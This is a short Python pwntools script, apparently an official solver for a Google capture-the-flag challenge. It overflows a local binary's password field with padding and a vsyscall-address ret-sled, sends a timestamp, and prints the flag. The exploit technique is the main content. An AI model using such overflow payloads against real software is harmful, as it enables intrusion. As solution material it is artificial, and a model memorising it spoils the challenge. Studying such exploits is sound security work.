#!/usr/bin/python
#
# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import time, struct

def init():
    from pwnlib.tubes.process import process
    global r
    r = process('./challenge')

def sendline(s):
    r.sendline(s)

def recvline():
    return r.recvline().strip()

def pack(n):
    return struct.pack('<Q', n)

init()
sendline('LIST')
user = recvline()
sendline('USER')
sendline(user)
sendline('PASS')
sendline('A' * 152 + pack(0xffffffffff600000) * 24)
sendline(pack(int(time.time())))

for _ in range(10):
    flag = recvline()
    if flag.startswith('CTF{') and flag.endswith('}'):
        print flag
        break
else:
    assert False
